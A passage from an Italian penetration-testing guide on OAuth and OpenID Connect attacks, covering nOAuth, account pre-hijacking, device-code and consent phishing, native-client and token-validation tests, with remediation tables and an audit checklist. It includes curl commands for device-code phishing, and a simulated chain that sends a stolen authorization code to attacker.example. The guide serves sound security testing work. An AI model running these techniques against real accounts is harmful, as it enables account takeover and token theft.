### nOAuth: l'`email` di Entra ID non è un identificatore

Su Azure AD / Entra ID il claim `email` deriva da un attributo che l'admin del proprio tenant può modificare **senza verifica**. Descope l'ha chiamato nOAuth. Se l'app usa `email` per trovare o unire gli account, il test è questo:

1. Crei un tuo tenant di test e imposti l'attributo email del tuo utente a quello della vittima di test.
2. Fai "Login with Microsoft" sull'app target.
3. Se vieni loggato nell'account della vittima, l'app si fida di un claim non verificato.

Nel JWT tutti i claim sono identici a quelli dell'utente reale tranne `email`: quello è il segnale. Fix: chiave composta `tid` + `oid` (o `sub`), mai `email`, `upn` o `preferred_username` per decisioni di identità; Microsoft ha introdotto anche il claim `xms_edov` (dominio dell'email verificato).

Controlla anche le app **multi-tenant**: con endpoint `common`/`organizations` l'`iss` cambia per tenant, quindi un client che accetta qualsiasi `iss` senza validare `tid` accetta token di tenant che non dovrebbe.

### Domini scaduti e "Sign in with Google"

Ricerca di Truffle Security: identificare un utente con `email` + `hd` non regge al cambio di proprietà del dominio. Chi compra il dominio di una startup chiusa può ricreare le caselle e fare login su SaaS dove i dipendenti si erano registrati con Google. Google ha prima chiuso la segnalazione come "won't fix", poi l'ha riaperta a fine 2024; al momento della fonte non c'era una correzione e non posso confermare lo stato attuale. Nei test lato assessment: verifica se l'app (a) usa `email`/`hd` come unica chiave, (b) fa join automatico a workspace per dominio, (c) permette il reset password senza un secondo fattore. Questa è una *classe di rischio* da riportare, non un exploit da lanciare su domini reali.

### Pre-hijacking e linking silenzioso

Sequenza classica (ricerca "Pre-hijacking attacks on web user accounts"): registri con la password un account con l'email della vittima **prima** che lei esista; quando la vittima si iscrive via OAuth, l'app unisce le identità e tu mantieni l'accesso. Test:

```
1) Register victim@example.com with a password (without confirming the email)
2) From another browser, OAuth login with the same address
3) After linking, does the password from step 1 still work?
```

Se sì, hai un account takeover persistente. Controlla anche `email_verified=false` accettato, sessioni aperte non invalidate al linking, e il flusso di reset ([Password Reset Attack](/articoli/password-reset-attack/)). Il quadro generale è in [Account Takeover](/articoli/account-takeover/).

***

## Attacco 10: device code phishing e consent phishing

Qui l'OAuth è l'arma, non il bersaglio: la vittima autentica sul sito **vero** del provider, quindi anche MFA forte non la protegge.

### Device Authorization Grant (RFC 8628)

Il device flow nasce per TV e CLI. L'attaccante chiede un codice, la vittima lo digita su `microsoft.com/devicelogin` pensando sia un login legittimo, e l'attaccante riceve access e refresh token. Esempio sul tuo tenant di laboratorio:

```bash
# 1) request device_code and user_code
curl -s -X POST https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode \
  -d 'client_id=<CLIENT_ID>' \
  -d 'scope=https://graph.microsoft.com/.default offline_access'
# → device_code, user_code, verification_uri, expires_in (about 900s), interval

# 2) polling until the "test victim" enters the code
curl -s -X POST https://login.microsoftonline.com/organizations/oauth2/v2.0/token \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
  -d 'client_id=<CLIENT_ID>' -d 'device_code=<DEVICE_CODE>'
# authorization_pending → retry; slow_down → increase the interval
```

Risposte da riconoscere: `authorization_pending`, `slow_down`, `expired_token`, `access_denied` (RFC 8628, sez. 3.5). Nelle campagne reali viene generato il codice solo quando la vittima clicca, così ha l'intera finestra di validità. Dopo il token si va su Graph, regole di posta o registrazione di device per ottenere un Primary Refresh Token: per questo, nei report, l'impatto va misurato su quello che i token permettono, non sul fatto che "il codice è stato inserito".

Tool usati nei lab e nei red team: **TokenTactics**, **ROADtools (`roadtx`)**, **GraphRunner**, **AADInternals**. Difesa: Conditional Access con blocco dell'**authentication flow "device code"** dove non serve, token di breve durata, alert sul primo accesso da device flow. Se vuoi il caso complementare con proxy AiTM sul login, c'è [Evilginx3](/articoli/evilginx3-aitm-mfa-bypass/); per l'ingegneria sociale intorno, [Phishing Techniques Red Team](/articoli/phishing-techniques-red-team/); e per capire perché la MFA da sola non basta, [2FA Bypass](/articoli/2fa-bypass/).

### Illicit consent grant

Registri un'app multi-tenant, chiedi scope come `Mail.Read` / `offline_access` e fai approvare il consenso a un utente. Da quel momento hai accesso **persistente senza password** e non decade con il cambio credenziali. Cosa testare in un tenant di laboratorio: chi può dare consenso (utenti vs solo admin), se esiste una policy di verifica degli publisher, quali scope sono concessi senza admin. Per il blue team le regole Elastic come Microsoft 365 Illicit Consent Grant via Registered Application mostrano cosa viene loggato.

***

## Attacco 11: app mobile e client nativi

Nei client nativi `redirect_uri` non è un URL web, e le regole cambiano (RFC 8252):

* **Custom URI scheme** (`myapp://callback`): più app sul device possono registrare lo stesso schema, e una app malevola intercetta il code. Con PKCE obbligatorio il code intercettato è inutile; senza, è furto di sessione.
* **Loopback** (`http://127.0.0.1:PORT`): qualunque processo locale può mettersi in ascolto sulla porta.
* **WebView embedded:** il login nella WebView dell'app permette all'app (o a codice iniettato) di leggere credenziali e cookie; il browser di sistema non lo permette.
* **Claimed https** (App Links / Universal Links): è la scelta consigliata, ma l'associazione col dominio va verificata.

Test su emulatore, in lab:

```bash
# How does the app react to a deep link with arbitrary code/state?
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://callback?code=TEST&state=TEST" com.example.app

# Which activities expose the scheme?
apktool d app.apk && grep -R "android:scheme" app/AndroidManifest.xml
```

Cosa osservi: l'app completa lo scambio con uno `state` che non ha generato? Gestisce `code` arrivati da altre app? Il traffico passa da Burp con il certificato di sistema? Il resto del workflow API lo trovi in [Burp Suite](/articoli/burp-suite/).

***

## Attacco 12: il token dopo il login (audience, scope, refresh)

Un login OAuth corretto può comunque finire in un'API che il token lo valida male. Test sul resource server:

```bash
# Token issued for app A accepted by B's API? (audience confusion)
curl -s https://api-b.example/v1/me -H "Authorization: Bearer $TOKEN_APP_A"

# Does a token with scope "read" manage to write?
curl -s -X POST https://api.example/v1/items -H "Authorization: Bearer $TOKEN_READ" -d '{}'

# Refresh token: is the old one still valid after use? Missing rotation and reuse detection?
curl -s -X POST https://as.example/token -d 'grant_type=refresh_token&refresh_token=$RT&client_id=APP'
```

Esito vulnerabile: 200 dove ti aspetti 401/403, `aud` non verificato, scope ignorato, refresh token riutilizzabile all'infinito. Se i token sono JWT, controlla `alg`, `kid`, `jku` e la verifica della firma ([JWT](/articoli/jwt/)); per le autorizzazioni sugli oggetti, [IDOR](/articoli/idor/) e [Broken Access Control](/articoli/broken-access-control/). Un `client_secret` trovato in repository o bundle JS entra nella stessa categoria ([Secret Scanning Automation](/articoli/secret-scanning-automation/)).

***

## Strumenti e setup di test

| Strumento                                          | A cosa serve in un test OAuth                                          |
| -------------------------------------------------- | ---------------------------------------------------------------------- |
| Burp Suite (Proxy, Repeater, Collaborator)         | Flusso, modifica parametri, callback e listener per SSRF/leak          |
| interactsh                                         | Listener OOB alternativo per `jwks_uri`, `logo_uri`, `request_uri`     |
| jwt\_tool                                          | Manipolazione e attacco di ID Token e access token JWT                 |
| DevTools (`getEventListeners`, Network)            | Individuare listener `postMessage` e pagine di errore con script terzi |
| TokenTactics, ROADtools, GraphRunner, AADInternals | Device code, token e Graph su tenant Microsoft di laboratorio          |
| adb, apktool, jadx                                 | Deep link e manifest delle app Android                                 |

Prima di ogni test salva una **baseline** del flusso legittimo e cambia **una variabile alla volta**: senza baseline non puoi dire quale modifica ha causato la risposta.

***

## Casi reali documentati (per il report e per il contesto)

| Caso                           | Tecnica                                                                                            | Lezione                                          |
| ------------------------------ | -------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| Booking.com (Salt Labs, 2023)  | Origin-only redirect + open redirect nello `state` + `resultUri` controllabile                     | Chain di difetti "minori"                        |
| Expo (Salt Labs, 2023)         | Difetto nel proxy OAuth di Expo, con impatto su centinaia di servizi di terze parti (Dark Reading) | Il rischio della supply chain di autenticazione  |
| nOAuth (Descope, 2023)         | `email` mutabile in Entra ID                                                                       | Mai identificare per email                       |
| Domini scaduti (Truffle, 2025) | `email` + `hd` riusabili dal nuovo proprietario                                                    | Identità legata al dominio, non alla persona     |
| Dirty dancing (Detectify)      | Gadget `postMessage` su pagine d'errore                                                            | Le pagine di errore fanno parte della superficie |

***

## Altri vettori che la RFC 9700 chiede di verificare

Non sono i più comuni, ma in un'audit completa vanno almeno controllati:

* **Open redirector sull'Authorization Server** (sez. 4.11.2): con un client registrato dall'attaccante, errori di richiesta, consenso rifiutato o `prompt=none` possono redirigere la vittima su un sito di phishing con la fiducia del dominio del provider.
* **Redirect 307** (sez. 4.12): se l'AS redirige con 307 dopo il login, il browser reinvia la POST con le credenziali al client. Il codice giusto è 303.
* **Mix-up** (sez. 4.4): rilevante solo se il client dialoga con **più** Authorization Server, uno dei quali controllato dall'attaccante, e usa lo stesso `redirect_uri` per tutti. Si previene con il parametro `iss` (RFC 9207) o con `redirect_uri` distinti. Includilo nel test solo quando le condizioni ci sono davvero.
* **Clickjacking sulla schermata di consenso** (sez. 4.16): se l'endpoint di autorizzazione si lascia inserire in un iframe, vedi [Clickjacking](/articoli/clickjacking/).
* **Credenziali del client esposte:** `client_secret` nel JavaScript, o token endpoint che non richiede autenticazione del client.

***

## Scenario completo (simulato in laboratorio)

> Questo non è un caso reale misurato: è una catena tipica ricostruita sui lab PortSwigger, per mostrare come le tecniche si combinano. Se la usi in un report, sostituisci i dati con le tue evidenze.

1. **Recon:** il discovery mostra `request_uri_parameter_supported=false`, `code_challenge_methods_supported` assente. L'app usa Authorization Code **senza PKCE**.
2. **Redirect:** `redirect_uri=https://client.example/oauth/callback/extra` viene accettato. L'AS valida il prefisso.
3. **Proxy page:** sul client esiste `/go?next=` (open redirect). Con `redirect_uri=https://client.example/go?next=https://attacker.example/collect` il code arriva al server di test.
4. **Uso del code:** lo scambio al callback legittimo non confronta il `redirect_uri` originale; il client completa il login e risponde con `Set-Cookie` di sessione dell'identità vittima.
5. **Evidenza per il report:** richieste e risposte di ogni passaggio, screenshot della sessione ottenuta, e il confronto con la baseline del test negativo.

Prerequisiti, risposte osservate e criterio di successo vanno sempre scritti per ogni passaggio: è ciò che rende la finding riproducibile e difendibile.

***

## Workflow di audit OAuth, passo per passo

| #  | Test                       | Cosa cambi                                                   | Esito vulnerabile                                      |
| -- | -------------------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| 1  | Mappa il flusso            | Nulla: osservi in Burp                                       | Parametri, flusso e endpoint chiari                    |
| 2  | Discovery                  | `GET /.well-known/openid-configuration`                      | Registration, `request_uri`, implicit, PKCE assente    |
| 3  | Validazione `redirect_uri` | Path, query, fragment, host                                  | Valore modificato accettato                            |
| 4  | Chain su pagina del client | `redirect_uri` verso open redirect / XSS                     | Code o token arriva a un host tuo                      |
| 5  | `state`                    | Rimuovi, statico, riuso, altra sessione                      | Callback completato lo stesso                          |
| 6  | Code                       | Riuso, altro client, altro `redirect_uri`                    | Token emesso                                           |
| 7  | PKCE                       | Senza `code_challenge`, senza `code_verifier`                | Scambio riuscito                                       |
| 8  | Leak                       | Referer, history, risorse esterne                            | Code/token visibile in header o log                    |
| 9  | Implicit                   | POST di login con dati modificati                            | Sessione di un altro utente                            |
| 10 | Scope                      | Extra scope al token o a `/userinfo`                         | Accesso a dati non approvati                           |
| 11 | Account linking            | Email non verificata, linking su email                       | Stessa sessione raggiungibile da due identità          |
| 12 | OIDC                       | Registrazione, `request_uri`, ID Token                       | SSRF, validazioni mancanti                             |
| 13 | Response type/mode         | `code,id_token`, `fragment`, `web_message`, state manipolato | Code/token resta in URL di pagine con script terzi     |
| 14 | Claim di identità          | `email`, `email_verified`, `hd`, `tid`/`oid`                 | Login come altro utente senza token rubato             |
| 15 | Device code / consenso     | Device flow, scope richiesti da app multi-tenant             | Token ottenuti dopo input della vittima di test        |
| 16 | Client nativi e API        | Deep link, `aud`, scope, refresh token                       | App o API accettano input o token non destinati a loro |

***

## Remediation e retest

| Problema                | Correzione                                                                                                                               | Come ripeti il test                                                  |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| `redirect_uri` debole   | Exact string matching, niente wildcard né open redirector sul client                                                                     | Ripeti i bypass: ogni variante deve dare errore                      |
| `state` assente/statico | Valore casuale monouso, legato alla sessione (o PKCE/`nonce` verificati)                                                                 | Callback senza `state` corretto deve fallire                         |
| PKCE opzionale          | PKCE obbligatorio con `S256`; rifiuta `code_verifier` senza `code_challenge`                                                             | Flusso senza challenge deve essere rifiutato                         |
| Code riutilizzabile     | Monouso, scadenza breve, binding a client e `redirect_uri`, revoca dei token a doppio uso                                                | Secondo scambio deve fallire                                         |
| Leak di code/token      | Niente risorse esterne sul callback, `Referrer-Policy: no-referrer`, `form_post`, no implicit                                            | Nessun `Referer` con parametri sensibili                             |
| Scope upgrade           | Confrontare lo scope del token con quello approvato                                                                                      | Scope extra respinto                                                 |
| Linking su email        | Usare `sub`+`iss`, richiedere `email_verified`, verificare l'email prima del linking                                                     | Email non verificata non collega nulla                               |
| OIDC                    | Validare `iss`, `aud`, `exp`, `nonce`, firma; registrazione autenticata; allowlist per `request_uri`                                     | Richieste su listener non arrivano                                   |
| Dirty dancing           | Nessuno script di terzi sulle pagine post-risposta ed errore, response type/mode abilitati solo se usati, origin check sui `postMessage` | Nessun gadget restituisce l'URL                                      |
| Claim mutabili          | Chiave utente = `sub`+`iss` (Entra: `tid`+`oid`), mai `email`; verifica prima del linking                                                | Cambiando `email` nel tenant di test non si entra nell'altro account |
| Device code             | Blocco del flow dove non serve, token brevi, alert su device flow                                                                        | Il flusso viene rifiutato dalla policy                               |
| Client nativi           | PKCE obbligatorio, claimed https, browser di sistema                                                                                     | Deep link con code arbitrario non completa il login                  |
| Token/API               | Verifica di `aud`, scope, rotazione e reuse detection del refresh token                                                                  | Token di un'altra app rifiutato (401/403)                            |

***

## Checklist OAuth Attack

```
REDIRECT_URI
☐ Exact matching: extra path, query and fragment rejected?
☐ Different host, subdomain, localhost.* tested
☐ Parameter pollution and parser discrepancy tested
☐ Wildcard: correct regex? takeover-able subdomains?
☐ response_mode (fragment, web_message, form_post) and combinations tested
☐ Client pages usable as proxy: open redirect, XSS, HTML injection

STATE / CSRF
☐ state present, random, single-use, bound to the session
☐ Callback without state or with another session's state rejected
☐ If state is missing: do PKCE or nonce really replace it?
☐ Forced linking tested with top-level navigation (not only <img>)

CODE / PKCE
☐ Code single-use and short-lived
☐ redirect_uri and client_id compared at exchange
☐ PKCE mandatory, S256, downgrade rejected
☐ Code injection: nonce validated in the ID Token

LEAK
☐ Referrer-Policy of the callback page
☐ External resources and links on the callback page
☐ Tokens/codes in history and logs
☐ Implicit flow in use? Fragment handled and sent to the server safely?

SCOPE
☐ Token scope = approved scope (code and implicit)
☐ Access to a resource requiring extra scope tested

ACCOUNT LINKING
☐ Linking based on email or on sub+iss?
☐ email_verified read and enforced
☐ Unverified pre-registered account reused at OAuth login?

OIDC
☐ Discovery and Dynamic Client Registration exposed without auth?
☐ logo_uri, jwks_uri, sector_identifier_uri, request_uri → SSRF
☐ request_uri: validation of the parameters inside the JWT
☐ ID Token: iss, aud, exp, nonce, signature, at_hash
☐ WebFinger: enumeration and injection

DIRTY DANCING
☐ response_type=code,id_token / token and alternative response_mode accepted?
☐ Flow error pages with third-party scripts?
☐ postMessage listeners without origin check that return the URL?
☐ State validated before or after receiving the code?

CLAIMS AND IDENTITY
☐ User identified by email/hd/upn or by sub (tid+oid)?
☐ Multi-tenant: tid validated?
☐ Account pre-hijacking with password before OAuth login

DEVICE CODE AND CONSENT
☐ Device code flow enabled without need?
☐ User consent to multi-tenant apps with sensitive scopes

NATIVE CLIENTS AND API
☐ Custom scheme/loopback without PKCE
☐ WebView instead of the system browser
☐ aud and scope verified by the resource server
☐ Refresh token with rotation and reuse detection
```

***

## Lab per allenarti

I laboratori PortSwigger Web Security Academy coprono quasi tutte le tecniche di questa guida, con vulnerabilità deliberate e un ambiente sicuro dove sbagliare: *Authentication bypass via OAuth implicit flow*, *Forced OAuth profile linking*, *OAuth account hijacking via redirect\_uri*, *Stealing OAuth access tokens via an open redirect*, *Stealing OAuth access tokens via a proxy page* e *SSRF via OpenID dynamic client registration*. Se vuoi un riferimento teorico solido, parti da OAuth 2.0 authentication vulnerabilities e dalla RFC 9700, lo standard aggiornato al gennaio 2025 che ha sostituito la vecchia bozza `draft-ietf-oauth-security-topics`.

***

## FAQ

**Qual è la differenza tra OAuth e OpenID Connect?**
OAuth 2.0 gestisce l'autorizzazione delegata (accesso ai dati di un utente). OpenID Connect aggiunge sopra l'autenticazione: ID Token, scope `openid`, claim standard e discovery. Il "login con Google" usa di solito OIDC.

**Il redirect\_uri con path traversal o encoding funziona sempre?**
No. Funziona solo se il server valida in modo debole (prefisso, wildcard, regex) o se normalizza l'URI in un momento diverso da quello del controllo. Con exact matching tutte le varianti falliscono.

**Rubare un authorization code basta per fare account takeover?**
Dipende. Il code va riscattato con un client valido e, se il server confronta il `redirect_uri` allo scambio e usa PKCE, un code rubato non serve. Serve la prova che il client completi il login con la sessione risultante.

**Il parametro state basta a bloccare il CSRF OAuth?**
Solo se è casuale, monouso, legato alla sessione e validato al callback. Un `state` statico equivale a nessuna protezione. PKCE e `nonce` (OIDC) sono alternative valide secondo la RFC 9700.

**PKCE sostituisce state?**
Può sostituirlo come difesa anti-CSRF, ma solo se il client ha verificato che l'Authorization Server supporti PKCE e lo imponga; altrimenti si apre il downgrade.

**Cos'è il "dirty dancing" in OAuth?**
Una tecnica in cui rompi il flusso del client (state, `response_type`, `redirect_uri`) per lasciare code o token nell'URL di una pagina d'errore, e poi li leggi con un gadget di terze parti (tipicamente `postMessage` senza controllo dell'origin). Non serve XSS sul sito.

**Cos'è nOAuth?**
Un difetto di integrazione: app che identificano l'utente con il claim `email` di Entra ID, che si può modificare nel proprio tenant senza verifica. Si risolve usando `sub` o `tid`+`oid` come chiave.

**PKCE ferma il device code phishing?**
No. In quel caso la vittima autentica sul sito legittimo e approva la richiesta dell'attaccante: servono policy sul flow (Conditional Access), non solo MFA.

**L'implicit flow è ancora usato?**
Sì, nelle app legacy. È sconsigliato per i nuovi sviluppi dalla RFC 9700 perché il token è esposto nell'URL e non è sender-constrainable; la scelta consigliata è Authorization Code con PKCE.

***

## Conclusione

Un test OAuth fatto bene non è una lista di payload: per ogni vettore devi sapere **quale condizione serve, che richiesta mandare, cosa guardare nella risposta e cosa provare per chiamarlo vulnerabilità**. Parti sempre dalla baseline, cambia una variabile alla volta e documenta anche i test negativi. Per approfondire il lato token e scope delle integrazioni leggi [OAuth Security](/articoli/oauth-security/); per la sessione dopo il login, [Session Hijacking](/articoli/session-hijacking/) e [Broken Authentication](/articoli/broken-authentication/); per il caso in cui il login è protetto da MFA e il token viene rubato col phishing, [Evilginx3 e AiTM](/articoli/evilginx3-aitm-mfa-bypass/). Tutto quanto descritto va usato solo su sistemi di tua proprietà o con autorizzazione scritta: lab, CTF, bug bounty nei limiti dello scope.
